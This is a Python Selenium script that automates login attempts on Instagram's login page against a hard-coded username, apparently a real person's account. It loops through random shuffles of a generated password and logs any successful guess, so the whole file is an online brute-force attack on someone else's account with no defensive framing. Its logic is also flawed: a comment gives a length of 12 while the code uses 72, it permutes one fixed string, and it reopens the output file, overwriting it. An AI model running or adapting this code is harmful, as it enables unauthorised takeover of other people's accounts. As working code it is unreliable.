import random
import datetime
import string
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# create an instance of ChromeOptions class
options = webdriver.ChromeOptions()
options.add_argument("--incognito")

# initialize the driver with the ChromeOptions instance
driver = webdriver.Chrome(options=options)

# go to the login page
driver.get("https://www.instagram.com/accounts/login/")

# wait for the username and password fields to load
username_input = WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.NAME, "username")))
password_input = WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.NAME, "password")))

your_username = "tanishaaa._.02"
username_input.send_keys(your_username)

def generate_password(length):
    """
    Generate a strong password of a given length.
    """
    # Define the characters to be used in the password
    chars = string.ascii_letters + string.digits + string.punctuation
    
    # Shuffle the characters to make the password more random
    chars = random.sample(chars, len(chars))
    
    # Generate the password by randomly selecting characters from the shuffled list
    password = ''.join(random.choice(chars) for _ in range(length))
    
    return password
# Generate a strong password of length 12
password = generate_password(72)
password = list(password)
# print(password)

start_time = datetime.datetime.now()

# open the output file to write the password attempts and results
output_file = open("password_attempts.txt", "w")
# password = ["Love", "@#", "Emiway"]
# try different passwords
passwords_tried = set()
while True:
    # generate a new password if the previous one has already been tried
    while True:
        random.shuffle(password)
        your_password = ''.join(password)
        if your_password not in passwords_tried:
            break
    passwords_tried.add(your_password)

    # enter the password and submit the form
    for i in range(len(your_password)):
        password_input.send_keys(Keys.BACKSPACE)
    password_input.send_keys(your_password)
    password_input.send_keys(Keys.RETURN)

    # wait for the popups to appear and dismiss them
    try:
        not_now_btn = WebDriverWait(driver, 1).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Not Now')]")))
        not_now_btn.click()
    except:
        pass

    try:
        not_now_btn = WebDriverWait(driver, 1).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Not Now')]")))
        not_now_btn.click()
    except:
        pass

    # check if login is successful
    if driver.current_url != "https://www.instagram.com/accounts/login/":
        output_file = open("password_attempts.txt", "w")
        output_file.write(f"Login successful! Password: {your_password}\n")
        print(f"Login successful! Password: {your_password}")
        dashboard = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CLASS_NAME, "Szr5J")))
        # print success message and write results to output file
        break
    try:
        dashboard = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CLASS_NAME, "Szr5J")))
        # print success message and write results to output file
        print(f"Login successful! Password: {your_password}")
        output_file.write(f"Login successful! Password: {your_password}\n")
        break
    except:
        # print failure message and write password attempt to output file
        print(f"Login unsuccessful. Attempted password: {your_password}")
        # output_file.write(f"Login unsuccessful. Attempted password: {your_password}\n")

# close the output file
output_file.close()
# get end time and calculate elapsed time
end_time = datetime.datetime.now()
elapsed_time = end_time - start_time

# format elapsed time in hh:mm:ss format
elapsed_time_str = str(elapsed_time).split(".")[0]

# print total time elapsed and number of password attempts
print(f"Elapsed time: {elapsed_time_str}, Number of password attempts: {len(passwords_tried)}")
